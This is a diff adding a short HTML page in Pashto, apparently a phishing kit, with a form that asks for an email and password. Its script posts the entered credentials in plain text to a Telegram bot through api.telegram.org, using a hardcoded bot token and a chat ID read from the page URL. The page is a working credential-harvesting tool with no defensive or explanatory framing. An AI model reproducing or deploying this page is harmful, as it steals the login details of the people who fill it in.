@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="ps">
+<head>
+  <meta charset="UTF-8">
+  <title>Telegram ته فورم</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      max-width: 400px;
+      margin: 50px auto;
+      padding: 20px;
+      border: 2px solid #ccc;
+      border-radius: 10px;
+      background-color: #f1f1f1;
+    }
+    input, button {
+      display: block;
+      width: 100%;
+      margin-bottom: 15px;
+      padding: 10px;
+      font-size: 16px;
+    }
+    button {
+      background-color: #2196F3;
+      color: white;
+      border: none;
+    }
+  </style>
+</head>
+<body>
+  <h2>معلومات ولیکه</h2>
+  <form id="telegramForm">
+    <input type="email" id="email" placeholder="ایمیل" required>
+    <input type="password" id="password" placeholder="پاسورډ" required>
+    <button type="submit">لیږل</button>
+  </form>
+
+  <script>
+    // 🔐 ثابت Telegram Bot Token
+    const botToken = '7964718139:AAHSriHqoXBuo__F_paB26fO1Sx774Dpk-k';
+
+    // 🧠 د URL نه Chat ID اخیستل
+    function getQueryParam(param) {
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get(param);
+    }
+
+    document.getElementById('telegramForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      const chatId = getQueryParam('id'); // له URL نه Chat ID
+
+      if (!chatId) {
+        alert('Chat ID په URL کې نشته!');
+        return;
+      }
+
+      const message = `💬 نوی معلومات:\n📧 ایمیل: ${email}\n🔐 پاسورډ: ${password}`;
+
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          alert('پیغام واستول شو!');
+        } else {
+          alert('خطا: پیغام ونه لیږل شو.');
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        alert('یوه خطا پېښه شوه.');
+      });
+    });
+  </script>
+</body>
+</html>
